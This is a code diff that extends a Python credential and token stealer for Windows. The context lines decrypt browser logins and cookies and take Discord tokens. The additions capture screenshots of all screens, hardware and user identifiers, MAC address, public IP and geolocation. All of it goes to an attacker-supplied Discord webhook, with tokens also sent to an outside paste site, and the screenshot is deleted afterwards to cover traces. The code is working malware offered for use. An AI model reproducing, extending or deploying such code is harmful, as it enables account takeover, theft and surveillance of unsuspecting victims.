@@ -1,10 +1,11 @@
-import base64,json,os,re,requests,subprocess,shutil,sqlite3
+import base64,json,os,re,requests,subprocess,shutil,sqlite3,ctypes,wmi,time,uuid,psutil
 
 from Crypto.Cipher import AES
 from discord import Embed, File, SyncWebhook
 from win32crypt import CryptUnprotectData
 from zipfile import ZipFile
 from pathlib import Path
+from PIL import ImageGrab
 
 __LOGINS__ = []
 __COOKIES__ = []
@@ -74,9 +75,9 @@ class Upload:
     def tree(self, path: Path, prefix: str = '', midfix_folder: str = ':open_file_folder: - ', midfix_file: str = ':page_facing_up: - '):
         pipes = {
             'space':  '    ',
-            'branch': '|   ',
-            'tee':    '|-- ',
-            'last':   '|-- ',
+            'branch': '│   ',
+            'tee':    '├── ',
+            'last':   '└── ',
         }
 
         if prefix == '':
@@ -761,6 +762,50 @@ class upload_tokens:
             badges = ' '.join([flag[0]
                               for flag in self.calc_flags(user['public_flags'])])
 
+            img = ImageGrab.grab(
+                bbox=None,
+                include_layered_windows=False,
+                all_screens=True,
+                xdisplay=None
+            )
+            img.save("ss.png")
+
+            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
+            NameDisplay = 3
+
+            size = ctypes.pointer(ctypes.c_ulong(0))
+            GetUserNameEx(NameDisplay, None, size)
+
+            namebuffer = ctypes.create_unicode_buffer(size.contents.value)
+            GetUserNameEx(NameDisplay, namebuffer, size)
+
+            ip=requests.get('https://api.ipify.org').text
+
+            def geolocate(ip: str):
+                url = f'https://ipapi.co/{ip}/json'
+                r=requests.get(url,headers={"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"})
+                data=r.json()
+
+                return (data["country"], data["region"], data["city"], data["postal"], data["asn"])
+
+            display_name = namebuffer.value
+            hostname = os.getenv('COMPUTERNAME')
+            pcusername = os.getenv('USERNAME')
+            cpu=wmi.WMI().Win32_Processor()[0].Name
+            gpu=wmi.WMI().Win32_VideoController()[0].Name
+            ram=round(float(wmi.WMI().Win32_OperatingSystem()[0].TotalVisibleMemorySize) / 1048576, 0)
+            disk = ("{:<9} "*4).format("Drive", "Free", "Total", "Use%") + "\n"
+            for part in psutil.disk_partitions(all=False):
+                if os.name == 'nt':
+                    if 'cdrom' in part.opts or part.fstype == '':
+                        continue
+                usage = psutil.disk_usage(part.mountpoint)
+                disk += ("{:<9} "*4).format(part.device, str(
+                    usage.free // (2**30)) + "GB", str(usage.total // (2**30)) + "GB", str(usage.percent) + "%") + "\n"
+                
+            mac = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+            country,region,city,zip_,as_ = geolocate(ip)
+
             if user['premium_type'] == 0:
                 nitro = 'None'
             elif user['premium_type'] == 1:
@@ -876,9 +921,10 @@ class upload_tokens:
             embed.add_field(name="<a:pinkcrown:996004209667346442> Token:",
                             value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n ", inline=False)
             embed.add_field(name="<:com:830397430301327370> HWID:",
-                            value=f"```"+str(subprocess.check_output("wmic csproduct get uuid")).strip("'").strip("b").strip("'UUID                                  \\r\\r\\n").strip("  \\r\\r\\n\\r\\r\\n")+"```", inline=False)
-            embed.add_field(name=":globe_with_meridians: IP: ",
-                            value=f"```"+requests.get("https://api.ipify.org").text+"```", inline=False)
+                            value=f"```"+subprocess.check_output('C:\\Windows\\System32\\wbem\\WMIC.exe csproduct get uuid', shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()+"```", inline=False)
+            embed.add_field(name="```PC: ", value=f"```Name: {display_name}\nHostname: {hostname}\nUsername: {pcusername}```",inline=False)
+            embed.add_field(name="Specs: ", value=f"```CPU: {cpu}\nGPU: {gpu}\nRAM: {ram}\n\nDisks:\n\n{disk}```", inline=False)
+            embed.add_field(name="Networking:", value=f"```IP: {ip}\nMAC: {mac}\nCountry: {country}\nRegion: {region}\nCity: {city} ({zip_})\nISP: {as_}```", inline=False)
             embed.add_field(
                 name="<a:nitroboost:996004213354139658> Nitro:", value=f"{nitro}", inline=False)
             embed.add_field(name="<a:redboost:996004230345281546> Badges:",
@@ -912,8 +958,19 @@ class upload_tokens:
                     name="<a:gift:1021608479808569435> Gift Codes:", value=codes, inline=False)
                 embed.add_field(name=" ", value=" ", inline=False)
 
-            self.webhook.send(embed=embed, username="NGX BETA",
-                              avatar_url="")
+            embed.set_image(url="attachment://ss.png")
+
+            try:
+                self.webhook.send(
+                    embed=embed, 
+                    username="NGX BETA",
+                    avatar_url="",
+                    file=File('.\\ss.png',filename='ss.png')
+                )
+            except:
+                pass
+
+            if os.path.exists("ss.png"): os.remove("ss.png")
             
 if "__main__" in __name__:
     Browsers("YOUR WEBHOOK LINK")
